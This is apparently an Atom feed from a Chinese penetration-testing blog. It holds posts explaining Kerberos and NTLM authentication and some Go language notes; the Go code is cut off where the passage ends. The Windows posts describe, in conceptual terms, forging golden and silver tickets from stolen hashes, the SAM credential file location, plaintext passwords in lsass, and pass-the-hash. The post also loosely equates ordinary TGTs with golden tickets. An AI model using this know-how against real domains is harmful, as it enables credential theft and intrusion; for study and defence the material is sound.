<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Se7en&#39;s Blog|专注渗透测试。</title>
  
  
  <link href="https://www.se7ensec.cn/atom.xml" rel="self"/>
  
  <link href="https://www.se7ensec.cn/"/>
  <updated>2021-10-20T18:06:14.565Z</updated>
  <id>https://www.se7ensec.cn/</id>
  
  <author>
    <name>Se7en</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>域渗透|Kerberos域认证机制剖析</title>
    <link href="https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/"/>
    <id>https://www.se7ensec.cn/2021/10/20/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/</id>
    <published>2021-10-20T10:10:24.000Z</published>
    <updated>2021-10-20T18:06:14.565Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Kerberos域认证机制剖析</p></blockquote><a id="more"></a><h1 id="Kerberos概念"><a href="#Kerberos概念" class="headerlink" title="Kerberos概念"></a>Kerberos概念</h1><p>Kerberos是一种网络认证协议，其设计目标是通过密钥系统为<code>Client / Server</code>应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。</p><p>在以上情况下， Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享 密钥)执行认证服务的。</p><h1 id="域认证所参与的角色"><a href="#域认证所参与的角色" class="headerlink" title="域认证所参与的角色"></a>域认证所参与的角色</h1><blockquote><p>Kerberos的标志是三只狗头，狗头分别代表以下三个角色</p></blockquote><ul><li><ol><li>访问服务的Client</li></ol></li><li><ol start="2"><li>提供服务的Server</li></ol></li><li><ol start="3"><li>KDC（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</li></ol></li></ul><p>其中KDC服务默认会安装在一个域的域控中，而<code>Client</code>和<code>Server</code>为域内的用户或者是服务，如<code>HTTP服务</code>，<code>SQL服务</code>。在<code>Kerberos</code>中<code>Client</code>是否有权限访问<code>Server</code>端的服务由<code>KDC(Key Distribution Center)</code>发放的票据来决定。</p><h1 id="Kerberos认证协议"><a href="#Kerberos认证协议" class="headerlink" title="Kerberos认证协议"></a>Kerberos认证协议</h1><h2 id="TGT（Ticket-Granting-Ticket）"><a href="#TGT（Ticket-Granting-Ticket）" class="headerlink" title="TGT（Ticket Granting Ticket）"></a>TGT（Ticket Granting Ticket）</h2><blockquote><p>由身份认证服务<code>AS(Authentication Service)</code>授予的票据，<code>TGT</code>用于身份认证，存储在内存，<strong>默认有效期为10小时</strong>，通过<code>TGT</code>能够获得<code>票据（Ticket）</code>，<code>TGT</code>是一种 <strong>临时凭证</strong> 的存在，又被称为 <strong>黄金票据</strong>。</p></blockquote><h2 id="票据（Server-Ticket-Ticket）"><a href="#票据（Server-Ticket-Ticket）" class="headerlink" title="票据（Server Ticket/Ticket）"></a>票据（Server Ticket/Ticket）</h2><blockquote><p>是网络对象互相访问的 <strong>凭证</strong>，又被称为 <strong>白银票据</strong>。</p></blockquote><h2 id="KDC-Key-Distribution-Center"><a href="#KDC-Key-Distribution-Center" class="headerlink" title="KDC(Key Distribution Center)"></a>KDC(Key Distribution Center)</h2><blockquote><p>负责管理票据、认证票据、分发票据，但是<code>KDC</code>不是一个独立的服务，它由以下服务组成：</p></blockquote><blockquote><ul><li><strong>AS(Authentication Service)</strong>: 身份认证服务，为<code>Client</code>生成<code>TGT(Ticket Granting Ticket)</code>的服务，<code>TGT</code>又被称为 <strong>黄金票据</strong>。</li><li><strong>TGS(Ticket Granting Service)</strong>: 票据授予服务，该服务为<code>Client</code>生成某个服务的<code>Ticket</code>，<code>Ticket</code>又被称为 <strong>白银票据</strong>。</li></ul></blockquote><h2 id="AD-Account-Database"><a href="#AD-Account-Database" class="headerlink" title="AD(Account Database)"></a>AD(Account Database)</h2><blockquote><p>一个类似于本机<code>SAM</code>的一个数据库，存储所有<code>Client</code>的白名单，只有存在于白名单的<code>Client</code>才能顺利申请到<code>TGT</code>。</p></blockquote><p><strong>※补充：从物理层面看，AD与KDC均为域控制器(Domain Controller)。</strong></p><h1 id="域认证粗略流程"><a href="#域认证粗略流程" class="headerlink" title="域认证粗略流程"></a>域认证粗略流程</h1><h2 id="过程简述"><a href="#过程简述" class="headerlink" title="过程简述"></a>过程简述</h2><p>①-②：<code>Client</code>向<code>kerberos</code>服务请求，希望获取访问<code>Server</code>的权限。 <code>kerberos</code>得到了这个消息，首先得判断<code>Client</code>是否是可信赖的， 也就是白名单黑名单的说法。</p><p>这就是<code>AS(Authentication Service)</code>服务完成的工作，通过在<code>AD(Account Database)</code>中存储黑名单和白名单来区分<code>Client</code>。</p><p>成功后，返回<code>AS(Authentication Service)</code>返回<code>TGT（Ticket Granting Ticket）</code>给<code>Client</code>。</p><p>③-④：<code>Client</code>得到了<code>TGT（Ticket Granting Ticket）</code>后，继续向<code>kerberos</code>请求，希望获取访问 <code>Server</code>的权限。<code>kerberos</code>又得到了这个消息，这时候通过<code>Client </code>消息中的<code>TGT</code>，判断出了<code>Client</code>拥有了这个权限，给了<code>Client</code>访问<code>Server</code>的权限<code>Ticket</code>。</p><p>⑤-⑥：<code>Client</code>得到<code>Ticket</code>后，终于可以成功访问<code>Server</code>。这个<code>Ticket</code>只是 针对这个<code>Server</code>，其他<code>Server</code>需要向<code>TGS(Ticket Granting Service)</code>申请。</p><p><img src="https://techdocs.broadcom.com/content/dam/broadcom/techdocs/us/en/assets/docops/casso128/kerberos_environment.png"></p><h2 id="较详简述"><a href="#较详简述" class="headerlink" title="较详简述"></a>较详简述</h2><ol><li><p><strong>AS_REQ</strong>: <code>Client</code>向<code>KDC</code>发起<code>AS_REQ</code>，请求凭据是<code>Client hash</code>加密的时间戳</p></li><li><p><strong>AS_REP</strong>: <code>KDC</code>使用<code>Client hash</code>进行解密，如果结果正确就返回用<code>krbtgt hash</code>加密的<code>TGT</code>票据，<code>TGT</code>里面包含<code>PAC</code>，<code>PAC</code>包含<code>用户Client</code>的<code>sid</code>和<code>用户Client</code>所在的<code>组</code>。</p></li><li><p><strong>TGS_REQ</strong>: <code>Client</code>凭借<code>TGT</code>票据向<code>KDC</code>发起针对特定<code>Server</code>的<code>TGS_REQ</code>请求</p></li><li><p><strong>TGS_REP</strong>: <code>KDC</code>使用<code>krbtgt hash</code>进行解密，如果结果正确，就返回用<code>Server hash</code>加密的<code>TGS</code>票据 [<code>Ticket</code>]（这一步不管用户有没有访问<code>Server</code>的权限，只要<code>TGT</code>正确，就返回<code>TGS</code>票据 [<code>Ticket</code>]）</p></li><li><p><strong>AP_REQ</strong>: <code>Client</code>拿着<code>TGS</code>票据(<code>Ticket</code>)去请求<code>Server</code></p></li><li><p><strong>AP_REP</strong>: <code>Server</code>使用自己的<code>hash</code>解密<code>TGS</code>票据(<code>Ticket</code>)。如果解密正确，就拿着<code>PAC</code>去<code>KDC</code>那边问<code>Client</code>有没有访问权限，域控解密<code>PAC</code>。获取<code>Client</code>的<code>sid</code>，以及所在的<code>组</code>，再根据该服务的<code>ACL</code>，判断<code>Client</code>是否有访问<code>Server</code>的权限。</p></li></ol><h1 id="域认证详细流程"><a href="#域认证详细流程" class="headerlink" title="域认证详细流程"></a>域认证详细流程</h1><h2 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h2><h2 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h2><h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><h1 id="票据伪造的原理"><a href="#票据伪造的原理" class="headerlink" title="票据伪造的原理"></a>票据伪造的原理</h1><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><blockquote><p>AS确认Client端登录者用户身份</p></blockquote><ul><li>KDC返回的Msg B：使用 <strong>TGS密钥(KDCHASH/KRBTGT用户NTLMHASH)</strong> 加密的 <strong>TGT(Ticket-Granting-Ticket)**，当我们获取到<code>krbtgt</code>用户的<code>NTLM hash</code>后，便可主动使用<code>krbtgt</code>用户的<code>NTLM hash</code>做为<code>TGS密钥</code>来生成<code>TGT</code>发送给<code>KDC</code>，这样<code>KDC</code>如果通过解密伪造<code>TGT</code>获取到伪造的 **[CLIENT/TGS SESSIONKEY]</strong> 可以成功解密 <code>Authenticator 1</code> 并完成与<code>TGT中</code>的数据进行比对，便成功骗过了<code>KDC</code>，也就是成功伪造了<code>黄金票据</code>。</li></ul><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><blockquote><p>Client向Server发送服务请求</p></blockquote><ul><li>客户端向服务器发送的为使用 <strong>SERVICE密钥(服务器的NTLMHASH)</strong> 加密的 <strong>CLIENT-TO-SERVER TICKET</strong> ，<code>Ticket</code>中包含用来供服务器解密<code>Authenticator 2</code>的 <strong>CLIENT/SERVER SESSIONKEY</strong> 。如果获取到了<code>Server</code>的<code>NTLM Hash</code>，便可伪造<code>Ticket</code>，和<code>Authenticator 2</code> ，<code>Server</code>在接收到<code>Ticket</code>和<code>Authenticator 2</code>后可以使用自己的<code>NTLM Hash</code>正常解密完成比对，也就是成功伪造了<code>白银票据</code>。</li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://daiker.gitbook.io/windows-protocol/kerberos">https://daiker.gitbook.io/windows-protocol/kerberos</a></p><p><a href="https://payloads.online/archivers/2018-11-30/1/">https://payloads.online/archivers/2018-11-30/1/</a></p><p><a href="https://www.cnblogs.com/0x7e/p/13862453.html">https://www.cnblogs.com/0x7e/p/13862453.html</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Kerberos域认证机制剖析&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="域渗透" scheme="https://www.se7ensec.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|Windows认证机制剖析</title>
    <link href="https://www.se7ensec.cn/2021/10/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/"/>
    <id>https://www.se7ensec.cn/2021/10/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%89%96%E6%9E%90/</id>
    <published>2021-10-19T07:10:24.000Z</published>
    <updated>2021-10-20T18:04:21.484Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Windows认证机制剖析：本地，工作组，域环境。</p></blockquote><a id="more"></a><h1 id="本地认证（User-Login）"><a href="#本地认证（User-Login）" class="headerlink" title="本地认证（User Login）"></a>本地认证（User Login）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>在本地登录Windows的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，操作系统中的密码存储在</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\system32\config\sam</span><br></pre></td></tr></table></figure><p>登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功!</p><p>这个<strong>SAM文件</strong>中保留了计算机<strong>本地所有用户</strong>的凭证信息，可以理解为是一个数据库。</p><p><strong>※注意：Windows本身不保存明文密码，只保留密码的<a href="https://baike.baidu.com/item/Hash/390310?fr=aladdin">Hash</a>。</strong></p><h2 id="NTLM-Hash的产生"><a href="#NTLM-Hash的产生" class="headerlink" title="NTLM Hash的产生"></a>NTLM Hash的产生</h2><blockquote><p>NTLM Hash的前身是LM Hash，由于存在安全缺陷已经被淘汰，无需做过多的了解，知道有这个东西即可</p></blockquote><p>假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin -&gt; hex(<span class="number">16</span>进制编码) = <span class="number">61646</span>d696e</span><br><span class="line"><span class="number">61646</span>d696e -&gt; Unicode = <span class="number">610064006</span>d0069006e00</span><br><span class="line"><span class="number">610064006</span>d0069006e00 -&gt; MD4 = <span class="number">209</span>c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><h2 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.用户注销、重启、锁屏后</span><br><span class="line"><span class="number">2</span>.操作系统会让winlogon显示登录界面，也就是输入框</span><br><span class="line"><span class="number">3</span>.接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码</span><br><span class="line"><span class="number">4</span>.将明文密码加密成NTLM Hash，对SAM数据库比较认证</span><br></pre></td></tr></table></figure><ul><li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li></ul><h1 id="网络认证（Net-NTLM）"><a href="#网络认证（Net-NTLM）" class="headerlink" title="网络认证（Net NTLM）"></a>网络认证（Net NTLM）</h1><blockquote><p>工作组环境和域环境下Net NTLM认证过程因为有DC（域控制器）的参与流程略有差异，不过不影响我们进行哈希传递攻击，这里分开讲一下。</p></blockquote><h2 id="NTLM-协议概念"><a href="#NTLM-协议概念" class="headerlink" title="NTLM 协议概念"></a>NTLM 协议概念</h2><p><strong>这个协议只支持Windows</strong></p><p>NTLM是一种网络认证协议，全称是：<code>NT LAN Manager</code>，它是基于<strong>挑战（Challenge）/响应（Response）认证机制</strong>的一种认证模式。</p><p>NTLM网络认证协议是<strong>以NTLM Hash作为根本凭证</strong>进行认证的协议，消息的传输依赖于使用NTLM的上层协议，比如<code>SMB</code>，<code>LDAP</code>，<code>HTTP</code>等。</p><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><h3 id="NTLM协议认证过程"><a href="#NTLM协议认证过程" class="headerlink" title="NTLM协议认证过程"></a>NTLM协议认证过程</h3><ul><li><p><strong>协商</strong>：主要用于确认双方协议版本，NTLM存在V1和V2两个版本，具体区别就是加密方式不同，这个一般不用管。</p></li><li><p><strong>质询</strong>：就是挑战（Challenge）/响应（Response）认证机制起作用的范畴，也是认证机制的核心。</p></li><li><p><strong>验证</strong>：验证主要是在质询完成后验证结果，是认证的最后一步。</p></li></ul><h4 id="协商"><a href="#协商" class="headerlink" title="协商"></a>协商</h4><p><img src="https://p1.ssl.qhimg.com/t01ec11da7d0c1ee154.png" alt="img"></p><h4 id="质询"><a href="#质询" class="headerlink" title="质询"></a>质询</h4><ul><li>1.<code>Client</code>向<code>Server</code>发送用户信息(用户名)请求。</li><li>2.<code>Server</code>收到用户信息后判断该本地账户列表是否存在（不存在就返回认证失败），存在则生成一个16位的随机数(<strong><code>Challenge</code></strong>)， 然后使用登录用户名对应的<code>NTLM Hash</code>加密<code>Challenge</code>(16位随机字符)， 生成一个<code>Challenge1</code>(<code>Net-NTLM Hash</code>)存在内存中。同时，将<code>Challenge</code>(16位随机字符)发送给<code>Client</code>。</li><li>3.<code>Client</code>接受到服务器发送的<code>Challenge</code>后，使用将要登录到账户对应的<code>NTLM Hash</code>加密<code>Challenge</code>生成<code>Response</code>（<code>Net-NTLM Hash</code>），然后将<code>Response</code>发送至<code>Server</code>。</li></ul><blockquote><p><strong>这里引入了Net NTLM Hash</strong>：经过NTLM Hash加密Challenge的结果在网络协议中称之为<strong>Net NTLM Hash</strong>（不能直接用来进行哈希传递攻击，但可以通过暴力破解来获取明文密码）。</p><p>详细介绍：<a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x03-net-ntlm-hash">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x03-net-ntlm-hash</a></p></blockquote><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><code>Server</code>收到<code>Client</code>发送的<code>Response</code>（<code>Net-NTLM Hash</code>）后，与之前保存在内存中的<code>Challenge1</code>(<code>Net-NTLM Hash</code>)比较，如果相等则认证通过。</p><p>现在再来看一下这个认证过程，是不是清晰了很多</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.10.19/1.PNG" alt="作者倾旋"></p><h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><h3 id="NTLM协议认证过程-1"><a href="#NTLM协议认证过程-1" class="headerlink" title="NTLM协议认证过程"></a>NTLM协议认证过程</h3><blockquote><p>域环境下Net NTLM认证过程因为有DC（域控制器）的参与工作组下的流程略有差异。</p></blockquote><p><img src="https://p5.ssl.qhimg.com/t01d0dfdfd6d7007c80.png" alt="作者daiker"></p><p>①用户登录客户端电脑。</p><p>②<code>Client</code>向<code>Server</code>发送<strong>协商消息</strong>，它主要包含客户端支持和服务器请求的功能列表。</p><p>③<code>Server</code>用<strong>质询消息（Challenge）</strong>进行响应，这包含服务器支持和同意的功能列表。但是最重要的是，它包含<code>Server</code>产生的Challenge。</p><p>④<code>Client</code>用<strong>身份验证消息（Response）</strong>回复质询。用户接收到步骤③中的Challenge之后，使用用户hash与challenge进行加密运算得到Response，将<code>response</code>，<code>username</code>，<code>challeng</code>发给<code>Server</code>。消息中的<code>response</code>（Net-NTLM Hash）是最关键的部分，因为它们向服务器证明客户端用户已经知道帐户密码。</p><p>⑤<code>Server</code>拿到<strong>身份验证消息（Response）</strong>后，使用challenge和用户hash进行加密得到<strong>response2</strong>与步骤③发来的<strong>response</strong>进行比较。</p><p>这时候，如果认证用户hash是存储在域控里面的话，那么本地没有认证用户hash，也就没办法计算response2，所以也就没法验证完成步骤⑤。<strong>所以<code>Server</code>就会通过<code>netlogon协议</code>联系域控</strong>，建立一个安全通道，然后将 <strong>协商消息</strong>，<strong>质询消息（Challenge）</strong>，<strong>身份验证消息（Response）</strong> 全部发给域控（这个过程也叫作<code>Pass Through Authentication</code>认证流程）。</p><p>⑥域控使用challenge和认证用户的hash进行加密得到response2，与type 3的response进行比较，判断是否一致。</p><p>⑦完成认证过程。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x02-ntlm-shen-fen-yan-zheng">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x02-ntlm-shen-fen-yan-zheng</a></p><p><a href="https://payloads.online/archivers/2018-11-30/1/">https://payloads.online/archivers/2018-11-30/1/</a></p><p><a href="https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/">https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Windows认证机制剖析：本地，工作组，域环境。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Go语言学习笔记</title>
    <link href="https://www.se7ensec.cn/2021/09/27/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.se7ensec.cn/2021/09/27/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-09-27T00:16:18.000Z</published>
    <updated>2021-10-08T11:03:33.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考（Ctrl c+v） <a href="https://www.kancloud.cn/kancloud/the-way-to-go/">https://www.kancloud.cn/kancloud/the-way-to-go/</a></p></blockquote><p>当个学习笔记，只记录重点。</p><a id="more"></a><h1 id="初始"><a href="#初始" class="headerlink" title="初始"></a>初始</h1><h2 id="平台与架构"><a href="#平台与架构" class="headerlink" title="平台与架构"></a>平台与架构</h2><p>Go 语言开发团队开发了适用于以下操作系统的编译器：</p><ul><li>Linux</li><li>FreeBSD</li><li>Mac OS X（也称为 Darwin）</li></ul><p>目前有2个版本的编译器：Go 原生编译器 gc 和非原生编译器 gccgo，这两款编译器都是在类 Unix 系统下工作 。其中，gc 版本的编译器已经被移植到 Windows 平台上，并集成在主要发行版中，你也可以通过安装 MinGW 从而在 Windows 平台下使用 gcc 编译器。这两个编译器都是以单通道的形式工作。</p><p>你可以获取以下平台上的 Go 1.4 源码和二进制文件：</p><ul><li>Linux 2.6+：amd64、386 和 arm 架构</li><li>Mac OS X（Snow Leopard + Lion）：amd64 和 386 架构</li><li>Windows 2000+：amd64 和 386 架构</li></ul><h2 id="Go-环境变量"><a href="#Go-环境变量" class="headerlink" title="Go 环境变量"></a>Go 环境变量</h2><ul><li><strong>$GOROOT</strong> 表示 Go 在你的电脑上的安装位置，它的值一般都是 <code>$HOME/go</code>，当然，你也可以安装在别的地方。</li><li><strong>$GOARCH</strong> 表示目标机器的处理器架构，它的值可以是 386、amd64 或 arm。</li><li><strong>$GOOS</strong> 表示目标机器的操作系统，它的值可以是 darwin、freebsd、linux 或 windows。</li><li><strong>$GOBIN</strong> 表示编译器和链接器的安装位置，默认是 <code>$GOROOT/bin</code>，如果你使用的是 Go 1.0.3 及以后的版本，一般情况下你可以将它的值设置为空，Go 将会使用前面提到的默认值。</li></ul><h2 id="安装目录清单"><a href="#安装目录清单" class="headerlink" title="安装目录清单"></a>安装目录清单</h2><ul><li><code>/bin</code>：包含可执行文件，如：编译器，Go 工具</li><li><code>/doc</code>：包含示例程序，代码工具，本地文档等</li><li><code>/lib</code>：包含文档模版</li><li><code>/misc</code>：包含与支持 Go 编辑器有关的配置文件以及 cgo 的示例</li><li><code>/os_arch</code>：包含标准库的包的对象文件（<code>.a</code>）</li><li><code>/src</code>：包含源代码构建脚本和标准库的包的完整源代码（Go 是一门开源语言）</li><li><code>/src/cmd</code>：包含 Go 和 C 的编译器和命令行脚本</li></ul><h2 id="Go调试器"><a href="#Go调试器" class="headerlink" title="Go调试器"></a>Go调试器</h2><ol><li>在合适的位置使用打印语句输出相关变量的值（<code>print</code>/<code>println</code> 和 <code>fmt.Print</code>/<code>fmt.Println</code>/<code>fmt.Printf</code>）。</li><li>在 <code>fmt.Printf</code> 中使用下面的说明符来打印有关变量的相关信息：<ul><li><code>%+v</code> 打印包括字段在内的实例的完整信息</li><li><code>%#v</code> 打印包括字段和限定类型名称在内的实例的完整信息</li><li><code>%T</code> 打印某个类型的完整说明</li></ul></li><li>使用 panic 语句（第 13.2 节）来获取栈跟踪信息（直到 panic 时所有被调用函数的列表）。</li><li>使用关键字 defer 来跟踪代码执行过程（第 6.4 节）。</li></ol><h2 id="构建并运行-Go-程序"><a href="#构建并运行-Go-程序" class="headerlink" title="构建并运行 Go 程序"></a>构建并运行 Go 程序</h2><p>在大多数 IDE 中，每次构建程序之前都会自动调用源码格式化工具 <code>gofmt</code> 并保存格式化后的源文件。如果构建成功则不会输出任何信息，而当发生编译时错误时，则会指明源码中具体第几行出现了什么错误，如：<code>a declared and not used</code>。一般情况下，你可以双击 IDE 中的错误信息直接跳转到发生错误的那一行。</p><p>如果程序执行一切顺利并成功退出后，将会在控制台输出 <code>Program exited with code 0</code>。</p><p>从 Go 1 版本开始，使用 Go 自带的更加方便的工具来构建应用程序：</p><ul><li><code>go build</code> 编译并安装自身包和依赖包</li><li><code>go install</code> 安装自身包和依赖包</li></ul><h1 id="语言的核心结构与技术"><a href="#语言的核心结构与技术" class="headerlink" title="语言的核心结构与技术"></a>语言的核心结构与技术</h1><h2 id="基本结构和基本数据类型"><a href="#基本结构和基本数据类型" class="headerlink" title="基本结构和基本数据类型"></a>基本结构和基本数据类型</h2><h3 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;hello, world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="包的概念"><a href="#包的概念" class="headerlink" title="包的概念"></a>包的概念</h3><p>包是结构化代码的一种方式：每个程序都由包（通常简称为 pkg）的概念组成，可以使用自身的包或者从其它包中导入内容。</p><p><code>package main</code>表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 <code>main</code> 的包。</p><p>所有的包名都应该使用<strong>小写字母</strong>。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p> <code>//</code> 单行注释<br> <code>/* xxxx */</code> 多行注释</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>你可以在括号 <code>()</code> 中写入 0 个或多个函数的参数（使用逗号 <code>,</code> 分隔），每个参数的名称后面必须紧跟着该参数的类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sum</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123; <span class="keyword">return</span> a + b &#125;</span><br></pre></td></tr></table></figure><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>基本类型：<code>int</code>、<code>float</code>、<code>bool</code>、<code>string</code></p><p>结构化的（复合的）：<code>struct</code>、<code>array</code>、<code>slice</code>、<code>map</code>、<code>channel</code></p><p>结构化的类型没有真正的值，它使用<code>nil</code>作为默认值</p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>类型 B 的值 = 类型 B(类型 A 的值)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">valueOfTypeB = typeB(valueOfTypeA)</span><br></pre></td></tr></table></figure><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> beef, two, c = “meat”, <span class="number">2</span>, “veg”</span><br><span class="line"><span class="keyword">const</span> Monday, Tuesday, Wednesday, Thursday, Friday, Saturday = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    Monday, Tuesday, Wednesday = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">    Thursday, Friday, Saturday = <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>声明变量时将变量的 类型 放在变量的 名称之后</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> identifier <span class="keyword">type</span></span><br><span class="line"></span><br><span class="line">多行根据变量的值来自动推断其类型</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    a = <span class="number">15</span></span><br><span class="line">    b = <span class="literal">false</span></span><br><span class="line">    str = <span class="string">&quot;Go says hello to the 